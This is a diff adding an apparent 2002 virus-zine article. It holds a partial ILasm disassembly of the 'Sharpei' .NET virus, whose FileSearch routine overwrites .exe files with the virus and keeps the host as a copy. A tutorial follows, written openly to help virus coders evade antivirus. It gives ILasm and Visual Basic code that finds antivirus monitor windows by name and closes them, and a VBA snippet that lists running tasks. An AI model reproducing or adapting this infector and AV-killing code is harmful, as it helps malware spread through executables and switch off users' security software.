+      IL_00f4:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
+      IL_00f9:  conv.i4
+      IL_00fa:  ldc.i4     0x3000
+      IL_00ff:  sub
+      IL_0100:  callvirt   instance void [mscorlib]System.IO.Stream::Write(unsigned int8[],
+                                                                           int32,
+                                                                           int32)
+      IL_0105:  ldloc.s    V_7
+      IL_0107:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
+      IL_010c:  stloc.s    V_9
+      IL_010e:  ldloc.s    V_7
+      IL_0110:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
+      IL_0115:  ldloc.s    V_9
+      IL_0117:  ldc.i4.0
+      IL_0118:  conv.i8
+      IL_0119:  ble.s      IL_015d
+
+      IL_011b:  ldsfld     string Sharp.Sharp::virname
+      IL_0120:  ldstr      "MS02-010.exe"
+      IL_0125:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
+      IL_012a:  brtrue.s   IL_015d
+
+      IL_012c:  newobj     instance void [System]System.Diagnostics.Process::.ctor()
+      IL_0131:  stloc.s    V_10
+      IL_0133:  ldloc.s    V_10
+      IL_0135:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
+      IL_013a:  ldstr      "temp.exe"
+      IL_013f:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
+      IL_0144:  ldloc.s    V_10
+      IL_0146:  callvirt   instance bool [System]System.Diagnostics.Process::Start()
+      IL_014b:  pop
+      IL_014c:  br.s       IL_015d
+
+      .try
+      {
+        IL_014e:  ldstr      "temp.exe"
+        IL_0153:  call       void [mscorlib]System.IO.File::Delete(string)
+        IL_0158:  leave.s    IL_015d
+
+      }  // end .try
+      catch [mscorlib]System.Object 
+      {
+        IL_015a:  pop
+        IL_015b:  leave.s    IL_015d
+
+      }  // end handler
+      IL_015d:  ldstr      "temp.exe"
+      IL_0162:  call       bool [mscorlib]System.IO.File::Exists(string)
+      IL_0167:  brtrue.s   IL_014e
+
+      IL_0169:  ret
+    } // end of method Sharp::Main
+
+    .method private hidebysig static void 
+            FileSearch(string DirectoryToCheck) cil managed
+    {
+      // Code size       225 (0xe1)
+      .maxstack  5
+      .locals init (string[] V_0,
+               int32 V_1,
+               int32 V_2,
+               string V_3,
+               class [mscorlib]System.IO.FileStream V_4,
+               int32 V_5,
+               class [mscorlib]System.IO.FileStream V_6,
+               class [mscorlib]System.IO.FileStream V_7,
+               unsigned int8[] V_8)
+      IL_0000:  ldarg.0
+      IL_0001:  ldstr      "*.exe"
+      IL_0006:  call       string[] [mscorlib]System.IO.Directory::GetFiles(string,
+                                                                            string)
+      IL_000b:  stloc.0
+      IL_000c:  ldloc.0
+      IL_000d:  ldlen
+      IL_000e:  conv.i4
+      IL_000f:  stloc.1
+      IL_0010:  ldc.i4.0
+      IL_0011:  stloc.2
+      IL_0012:  br         IL_00cf
+
+      IL_0017:  ldloc.0
+      IL_0018:  ldloc.2
+      IL_0019:  ldelem.ref
+      IL_001a:  stloc.3
+      IL_001b:  ldloc.3
+      IL_001c:  ldc.i4.3
+      IL_001d:  ldc.i4.1
+      IL_001e:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
+                                                                               valuetype [mscorlib]System.IO.FileMode,
+                                                                               valuetype [mscorlib]System.IO.FileAccess)
+      IL_0023:  stloc.s    V_4
+      IL_0025:  ldloc.s    V_4
+      IL_0027:  ldc.i4.s   18
+      IL_0029:  conv.i8
+      IL_002a:  ldc.i4.0
+      IL_002b:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
+                                                                           valuetype [mscorlib]System.IO.SeekOrigin)
+      IL_0030:  pop
+      IL_0031:  ldloc.s    V_4
+      IL_0033:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
+      IL_0038:  stloc.s    V_5
+      IL_003a:  ldloc.s    V_4
+      IL_003c:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
+      IL_0041:  ldloc.s    V_5
+      IL_0043:  ldc.i4.s   103
+      IL_0045:  beq        IL_00cb
+
+      .try
+      {
+        IL_004a:  ldloc.3
+        IL_004b:  ldc.i4     0x80
+        IL_0050:  call       void [mscorlib]System.IO.File::SetAttributes(string,
+                                                                          valuetype [mscorlib]System.IO.FileAttributes)
+        IL_0055:  ldloc.3
+        IL_0056:  ldstr      "hostcopy.exe"
+        IL_005b:  ldc.i4.1
+        IL_005c:  call       void [mscorlib]System.IO.File::Copy(string,
+                                                                 string,
+                                                                 bool)
+        IL_0061:  ldsfld     string Sharp.Sharp::virname
+        IL_0066:  ldloc.3
+        IL_0067:  ldc.i4.1
+        IL_0068:  call       void [mscorlib]System.IO.File::Copy(string,
+                                                                 string,
+                                                                 bool)
+        IL_006d:  ldstr      "hostcopy.exe"
+        IL_0072:  ldc.i4.3
+        IL_0073:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
+                                                                                 valuetype [mscorlib]System.IO.FileMode)
+        IL_0078:  stloc.s    V_6
+        IL_007a:  ldloc.3
+        IL_007b:  ldc.i4.6
+        IL_007c:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
+                                                                                 valuetype [mscorlib]System.IO.FileMode)
+        IL_0081:  stloc.s    V_7
+        IL_0083:  ldloc.s    V_6
+        IL_0085:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
+        IL_008a:  conv.i4
+        IL_008b:  conv.ovf.u4
+        IL_008c:  newarr     [mscorlib]System.Byte
+        IL_0091:  stloc.s    V_8
+        IL_0093:  ldloc.s    V_6
+        IL_0095:  ldloc.s    V_8
+        IL_0097:  ldc.i4.0
+        IL_0098:  ldloc.s    V_6
+        IL_009a:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
+        IL_009f:  conv.i4
+        IL_00a0:  callvirt   instance int32 [mscorlib]System.IO.Stream::Read(unsigned int8[],
+                                                                             int32,
+                                                                             int32)
+        IL_00a5:  pop
+        IL_00a6:  ldloc.s    V_7
+        IL_00a8:  ldloc.s    V_8
+        IL_00aa:  ldc.i4.0
+        IL_00ab:  ldloc.s    V_6
+        IL_00ad:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
+        IL_00b2:  conv.i4
+        IL_00b3:  callvirt   instance void [mscorlib]System.IO.Stream::Write(unsigned int8[],
+                                                                             int32,
+                                                                             int32)
+        IL_00b8:  ldloc.s    V_6
+        IL_00ba:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
+        IL_00bf:  ldloc.s    V_7
+        IL_00c1:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
+        IL_00c6:  leave.s    IL_00cb
+
+      }  // end .try
+      catch [mscorlib]System.Object 
+      {
+        IL_00c8:  pop
+        IL_00c9:  leave.s    IL_00cb
+
+      }  // end handler
+      IL_00cb:  ldloc.2
+      IL_00cc:  ldc.i4.1
+      IL_00cd:  add
+      IL_00ce:  stloc.2
+      IL_00cf:  ldloc.2
+      IL_00d0:  ldloc.1
+      IL_00d1:  blt        IL_0017
+
+      IL_00d6:  ldstr      "hostcopy.exe"
+      IL_00db:  call       void [mscorlib]System.IO.File::Delete(string)
+      IL_00e0:  ret
+    } // end of method Sharp::FileSearch
+
+    .method private hidebysig specialname rtspecialname static 
+            void  .cctor() cil managed
+    {
+      // Code size       36 (0x24)
+      .maxstack  2
+      IL_0000:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
+      IL_0005:  ldstr      "Software\\Sharp"
+      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
+      IL_000f:  ldstr      ""
+      IL_0014:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
+      IL_0019:  castclass  [mscorlib]System.String
+      IL_001e:  stsfld     string Sharp.Sharp::virname
+      IL_0023:  ret
+    } // end of method Sharp::.cctor
+
+    .method public hidebysig specialname rtspecialname 
+            instance void  .ctor() cil managed
+    {
+      // Code size       7 (0x7)
+      .maxstack  1
+      IL_0000:  ldarg.0
+      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
+      IL_0006:  ret
+    } // end of method Sharp::.ctor
+
+  } // end of class Sharp
+
+} // end of namespace Sharp
+
+//*********** DISASSEMBLY COMPLETE ***********************
+// WARNING: Created Win32 resource file C:\sharp.res
+
+-------------------------------------------------------------------------------------------------
+
+don't wait for the source code of sharpei in coderz.net #3.... let us all study ilasm and be able to understand 
+this listing....
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+by : IllAwesome\\\\\\\\\\\\\\\\\\
+7152002\\\\\\\\\\\\\\\\\\\\\\\\\\\
+"IL Asm is the pyucha..."\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+Turning off AV monitors in ILasm\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+after "Hello World!" using .NET class Libraries and Windows DLL and the Sharpei disasm, i've decided to write a proggie 
+that will help the future IL viruses evade AV detection... yes, boys and girls, i'll teach those future ILasm virus
+coders to make their viruses turn off AV monitors...
+
+I've read three tutes that tackles this topic of turning of AV monitors... Benny's, LiteSys's and alcopaul's... 
+Benny's and LiteSys's demoed it in win32asm... alcopaul's demoed it in visual basic... 
+
+And i will do it in ILasm...  :)
+
+i've done a lot of experimenting before comin' up with a successful code.. a tute helped me a lot to do it right..
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+the following code is an excerpt from alcopaul's tute...  \\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Option Explicit
+Private Declare Function FindWindow Lib "user32" _
+         Alias "FindWindowA" _
+         (ByVal lpClassName As String, _
+         ByVal lpWindowName As String) As Long
+
+Private Declare Function PostMessage Lib "user32" _
+         Alias "PostMessageA" _
+         (ByVal hwnd As Long, _
+         ByVal wMsg As Long, _
+         ByVal wParam As Long, _
+         ByVal lParam As Long) As Long
+      
+Const WM_CLOSE = &H10
+sub main()
+on error resume next
+Dim a As Long 
+Dim b As Long
+dim avn, avn1, ..., avn(n), num3, arrr3, av
+avn = "AVP Monitor"
+avn1 = "NAI_VS_STAT"
+avn(n) = avname
+For num3 = 0 To n
+arrr3 = Array(avn, avn1, ..., avn(n))
+av = arrr3(num3)
+a = FindWindow(vbNullString, av)
+b = PostMessage(a, WM_CLOSE, vbNull, vbNull)
+Next num3
+end sub
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+end of excerpt\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+we must pass a nullstring and AV Window name to FindWindow, store it to a variable and pass that variable as a parameter to
+PostMessage with &H10 (dec = 16), null (0) and null (0) as other parameters respectively...
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+ILASM TIME! \\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+now let's code...
+
+
+------------------------------------------------------------------------
+.module extern user32.dll
+
+.assembly IllAwesomeDidItAgain{}
+
+.class public AVoff
+
+{
+  .method public hidebysig static pinvokeimpl("user32.dll" winapi) 
+          int32  FindWindow(string classname,
+                            string windowname) cil managed preservesig
+{
+}
+  .method public hidebysig static pinvokeimpl("user32.dll" winapi) 
+          int32  PostMessage(int32 wind,
+                             int32 msg,
+                             int32 param,
+                             int32 paramm) cil managed preservesig
+{
+}
+.method public static void  Main() cil managed
+{
+.entrypoint
+.maxstack  4
+.locals (int32 Valx)                           // our variable
+ldnull                                         // load null to the classname
+ldstr      "AVP Monitor"                       // load the Window name i.e. AVP
+call       int32 AVoff::FindWindow(string,     // Findwindow(null, "AVP Monitor")
+                                   string)
+stloc.0                                        // store result to our variable
+ldloc.0                                        // load the result to the 1st param of Postmessage
+ldc.i4.s   16                                  // 16 = 10h, close
+ldc.i4.0                                       // null
+ldc.i4.0                                       // null
+call       int32 AVoff::PostMessage(int32,
+                                    int32,
+                                    int32,
+                                    int32)    // postmessage!
+pop					      // AVP fuck off!	
+ret
+} 
+}
+
+-----------------------------------------------------------------------------
+
+
+our task is finished...
+
+calling win32apis from .net proggies? that's what you call platform invoke...
+
+platform invoke syntax
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+.method public hidebysig static pinvokeimpl("dllfile" winapi)          \\\\\\\\\
+          int32  APIname(params,				        \\\\\\\\\
+                         params1) cil managed preservesig                \\\\\\\\\
+{									  \\\\\\\\\
+}									   \\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+examples
+
+------------------------------------------------------------------------
+  .method public hidebysig static pinvokeimpl("user32.dll" winapi) 
+          int32  FindWindow(string classname,
+                            string windowname) cil managed preservesig
+{
+}
+------------------------------------------------------------------------
+  .method public hidebysig static pinvokeimpl("user32.dll" winapi) 
+          int32  MessageBox(int32 hWnd,
+                            string text,
+                            string caption,
+                            int32 type) cil managed preservesig
+  {
+  }
+------------------------------------------------------------------------
+
+you should have your win32api reference to determine the type of the parameters (if it's string, int32, etc..)
+
+
+\\\\\\\\\\\\
+final note \\
+\\\\\\\\\\\\\\
+
+how will we get the list of running avs?
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+an excerpt from alcopaul's tute\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+Use MS-Word VB Editor\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+--------------
+Sub search()
+On Error Resume Next
+For I = 1 to Tasks.Count
+Windowname = Tasks.Item(I).Name
+Set fs = CreateObject("Scripting.FileSystemObject")
+Set a = fs.CreateTextFile("c:\avlist.txt", True)
+a.WriteLine Windowname
+Next
+a.Close
+End Sub
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+end of excerpt\\\\\\\\\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+addendum : alcopaul was notified and said ok about putting his code snippets in this article....
+
+that's all folks... let us all explore and discover the power of IL asm....
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+revisiting Hello World!  \\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+there's this other way to code your hello world in ilasm
+-----------------------------------------------------------
+.module extern user32.dll
+.assembly ILHello{}
+
+.class public HelloWorld
+
+{
+  .method public hidebysig static pinvokeimpl("user32.dll" winapi) 
+          int32  MessageBox(int32 hWnd,
+                            string text,
+                            string caption,
+                            int32 type) cil managed preservesig
+  {
+  }
+  
+.method static public void main() cil managed
+{
+.entrypoint
+.maxstack 8
+ldc.i4.0
+ldstr "Hello World!"
+ldstr "by IllAwesome"
+ldc.i4.0
+call  int32 HelloWorld::MessageBox(int32,
+                              string,
+                              string,
+                              int32)
+pop
+ret
+}
+}
+---------------------------------------------------------------
+
+\\\\\\\\\\\\\\\\\\\\\\\\\
+IllAwesome\\\\\\\\\\\\\\\\
+7162002\\\\\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+edited\\\\\\\\\\\\\\\\\\\\\\\
+7192002\\\\\\\\\\\\\\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+"ILAsm is the pyucha!"\\\\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+mailto:illawesome@lycos.com\\\\\\\
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+From [BCVG] Zine #2
+
